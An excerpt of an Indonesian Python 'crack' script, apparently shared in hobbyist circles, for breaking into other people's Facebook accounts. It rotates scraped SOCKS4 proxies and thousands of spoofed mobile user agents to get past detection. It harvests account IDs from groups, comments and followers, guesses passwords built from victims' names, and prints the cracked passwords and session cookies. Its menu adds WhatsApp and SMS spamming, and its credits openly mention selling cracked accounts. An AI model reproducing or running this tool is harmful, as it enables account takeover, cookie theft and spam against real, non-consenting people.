...
from concurrent.futures import ThreadPoolExecutor as ALDii 
...
sys.stdout.write('\x1b]2; SCRIPT CRACKED BY ALDI\x07')
#------------------[ GET PROXY ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Stabil/Kuota Anda Telah Habis!!!.');exit()
...
def useragent():
	for tu in range(random.randint(1000,10000)):
...
for aldiilesmana in range(10):
	...
	ugemeh=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	ugen.append(ugemeh)
	
for aldiiii in range(10000):
    rr = random.randint
    rc = random.choice
    ...
    #Nokia#
    series = random.choice(['5.3','5.4','5.5'])
    nokia = random.choice(['NokiaX7-00','Nokia700','Nokia603','Nokia808PureView','NokiaE6-00','Nokia5340'])
    ino = random.choice(['112.010.1404','111.040.1511','112.010.1404','113.010.1507','111.040.1511'])
    kiaser = random.choice(['NokiaBrowser/8.2.1.20','NokiaBrowser/8.3.1.4','NokiaBrowser/8.2.1.20','NokiaBrowser/8.3.2.21'])
    webKit = random.choice(['535.1','525'])
    version = random.choice(['Version/3.0'])
    #Vivo#
    ...
    jkj = random.randint(11111111,99999999)
    jka = random.randint(200600,200999)
    jkb = random.randint(4,13)
    jkc = random.randint(20000000,99999999)
    ...
    ua3 = f"Mozilla/5.0 (Symbian/3; Series60/{series} {nokia}/{ino}; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/{webKit} (KHTML, like Gecko) {kiaser} Mobile Safari/535.1 3gpp-gba"
    ua4 = f"{nokia}/{ino} (Symbian/3; Series60/{series} Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/{webKit} (KHTML, like Gecko) {version} {kiaser} 3gpp-gba"
    ua5 = f"Mozilla/5.0 (Linux; Android {xio}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(3400,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200,700))}.0.0.{str(rr(10,30))}.{str(rr(30,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/vivo;FBBD/vivo;FBDV/{device_vivo};FBSV/{versi_android};FBOP/16]"
    ua6 = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(5000,5999))}.{str(rr(10,100))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(700,999))}.0.0.{str(rr(100,200))}.{str(rr(200,350))};]"
    ua7 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]"
    ua8 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]"
    ua9 = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000,229999))}.0{str(rr(1,30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,130))}.0.{str(rr(5000,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90,600))}.0.0.{str(rr(1,30))}.{str(rr(100,150))};]"
    ua10 = f"Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300,600))}.0.0.{str(rr(10,90))}.{str(rr(100,150))};FBBV/{str(rr(200000000,299999999))};WV;FBDM/"+"{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]"
    ua11 = f"Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.{str(rr(111111,199999))}.001) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
    UaMainn = random.choice([u1, u2, ua3, ua4, ua5, ua6, ua7, ua8, ua9, ua10, ua11])
    ugen.append(UaMainn)
...
def uaku():
#Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.2.3767.68393
	try:
...
def banner():
	cetak(panel(f"""{H2}╭─────────╮\n│ {M2}⬤  {K2}⬤  {H2}⬤ {H2}│ \n{H2}╰─────────╯{H2}
      ...
      {W2}│█████████████│{W3}│─│──│─│────││─││───────│─────│─│─│─│{P2}───────{B2}████           
      {W1}└─────────────┘{W3}╚═╝──╚═╩════╝╚═╝╚═══════╩═════╩═════╝{P2}──────{B2}██████                       
      """,width=90,title=f"[ BY ALDI ]",style=f"{color_panel}"))
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python krekk.py");bottnyaaa()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f"{W3}• {W2}Rajin Beribadah Agar Rezeki Selalu Ada Di Depan Wajah - Aldii\n{P2}Ketik [green]credit {P2}untuk menampilkan nama credit script ini".center(100),width=90,title=f"[bold green][ INGFONYA ]",style=f"bold white"))
	MENU_KREK_ALDI = input(f' [+] Pilih Menu Crack : ')
	if MENU_KREK_ALDI  in ['credit','Credit','CREDIT']:
	 credit()
	elif MENU_KREK_ALDI in ['1','01']:
		aldiiii_dump()
	elif MENU_KREK_ALDI in ['2','02']:
		dump_massal()
	elif MENU_KREK_ALDI in ['3','03']:
		crack_group()
	elif MENU_KREK_ALDI in ['4','04']:
		crack_email()
	elif MENU_KREK_ALDI in ['5','05']:
		crack_file()
	elif MENU_KREK_ALDI in ['6','06']:
		crack_nama()
	elif MENU_KREK_ALDI in ['7','07']:
		pengikut()
	elif MENU_KREK_ALDI in ['8','08']:
		komen()
	elif MENU_KREK_ALDI in ['9','09']:
		file_cp()
	elif MENU_KREK_ALDI in ['10']:
		result()
	elif MENU_KREK_ALDI in ['11']:
		siu()
	elif MENU_KREK_ALDI in ['12']:
		spam_wa()
	elif MENU_KREK_ALDI in ['13']:
		spam_sms()
	elif MENU_KREK_ALDI in ['14']:
		dumpid()
	elif MENU_KREK_ALDI  in ['15']:
...
###--------[ CREDIT ]------###
def credit():
   cetak(panel(f"""{W3} • Alvino_Xy\n • DerrXr\n • Asepit-Gans\n • Rozhak XD\n • Rochmat Basuki\n • Nazri XD\n • Aorec XD\n • Lukman-XD\n • Dapunta\n • Kall\n • Fanz-XD\n • Adel-Dev\n • BrayeenXD\n • Aldii\n • Leo-XD\n • Firman JR\n\n{W2}JANGAN CLAIM SCRIPT INI SEBAGAI PUNYA LU DAN SAMPAI DIJUAL JUAL, SC INI FREE DAN TIDAK ADA KEUNTUNGAN DARI SCRIPT INI KECUALI ANDA MENJUAL HASIL MENGCRACK FACEBOOK ORANG!!!, JIKA KETAHUAN ANDA MENJUAL SCRIPT INI, KAMI TIDAK SEGAN SEGAN MEMBUAT JANGAN HAPUS NAMA CREDIT INI BILA PERLU DI TAMBAHIN AJA!!! -sabtu, 10 juni 2023 by Aldii""".center(50),width=90,padding=(0,1),title=f"[bold green][ C R E D I T ]",style=f"bold white"))
   time.sleep(5)
   exit()
###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
...
def crack_email():
	...
	blk = ['tika','milla','aldiiii','gabriel','lala','cans','nayla','pandi','miftah','kurnia','sinta','nadia','gadis','anggun','amoy','anna']
	global ok , cp
...
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
	...
	_aldiiii_ = input(' [+] Pilih : ')
	if _aldiiii_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	elif _aldiiii_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
			...
			for yuzong in id2:
				...
				if len(nmf)<6:
					if len(frs)<3:
						...
						pwv.append(frs+'321123')
						pwv.append(frs+'123098')
						pwv.append(frs+'1010')
						pwv.append(frs+'1122')
						pwv.append(frs+'112233')
						pwv.append(frs+'123456789')
						pwv.append(frs+'161003')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='ALDii-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n[•] U-AGENT : {ua}'
					statusok1 = nel(statusok, width=90, style='bold green', title='ALDii-OK')
					cetak(statusok1)
